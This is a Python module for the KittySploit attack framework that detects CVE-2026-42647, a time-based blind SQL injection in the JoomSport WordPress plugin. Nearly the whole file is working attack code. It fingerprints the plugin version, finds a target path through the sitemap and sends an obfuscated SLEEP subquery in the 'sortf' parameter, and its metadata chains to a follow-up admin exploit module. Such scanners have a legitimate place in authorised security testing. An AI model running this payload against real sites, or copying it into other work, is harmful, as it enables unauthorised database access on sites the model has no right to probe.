#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""JoomSport <= 5.7.7 sortf SQLi (CVE-2026-42647)."""

import re
import time

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

_PLUGIN = "joomsport-sports-league-results-management"
_VULN_HIGH = (5, 7, 7)
_PLAYER_MARKERS = ("Name", "Match played", "Played minutes")


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "JoomSport CVE-2026-42647 SQLi detect",
        "description": "Time-based blind SQLi via playerlist sortf GET parameter.",
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2026-42647",
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-42647"],
        "modules": ["auxiliary/admin/http/joomsport_cve_2026_42647_sqli"],
        "tags": ["web", "scanner", "wordpress", "joomsport", "sqli", "cve-2026-42647"],
        "agent": {
            "approval_required": True,
            "chain": {
                "suggested_followups": ["auxiliary/admin/http/joomsport_cve_2026_42647_sqli"],
            },
        },
    }

    base_path = OptString("/", "WordPress base path", required=False)
    season_path = OptString("", "Season URL path (auto from sitemap if empty)", required=False)
    sleep_seconds = OptInteger(6, "SLEEP duration", required=False)

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.base_path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def _season_path(self) -> str:
        forced = (self.season_path or "").strip()
        if forced:
            return forced if forced.startswith("/") else f"/{forced}"
        sm = self.http_request(
            method="GET",
            path=self._join("/wp-sitemap-posts-joomsport_season-1.xml"),
            allow_redirects=False,
        )
        if not sm:
            return ""
        m = re.search(r"<loc>[^<]*?//[^/]+(/[^<]+)</loc>", sm.text or "")
        return m.group(1) if m else ""

    def _player_ok(self, html: str) -> bool:
        return html and all(x in html for x in _PLAYER_MARKERS)

    def _timed(self, path: str, sortf: str) -> float:
        start = time.monotonic()
        resp = self.http_request(
            method="GET",
            path=self._join(path),
            params={"action": "playerlist", "sortf": sortf, "sortd": "ASC"},
            allow_redirects=True,
            timeout=25,
        )
        if not resp or not self._player_ok(resp.text or ""):
            return 0.0
        return time.monotonic() - start

    def run(self):
        base = self.wp_normalize_base_path(self.base_path or "/")
        version = self.wp_plugin_version(_PLUGIN, base) or ""
        if version and not self.wp_version_in_range(version, (0, 0, 0), _VULN_HIGH):
            return False
        season = self._season_path()
        if not season:
            return False
        sleep_s = int(self.sleep_seconds or 6)
        base_t = self._timed(season, "post_title") or 0.1
        inj = "post_title`,(SELECT/**/x/**/FROM/**/(SELECT/**/SLEEP({})/**/AS/**/x)/**/AS/**/t)#".format(
            sleep_s
        )
        delayed = self._timed(season, inj)
        if delayed >= sleep_s - 1 and delayed > base_t + (sleep_s - 2):
            self.set_info(
                severity="critical",
                reason="JoomSport playerlist sortf time-based SQLi",
                path=season,
                cve="CVE-2026-42647",
            )
            return True
        return False
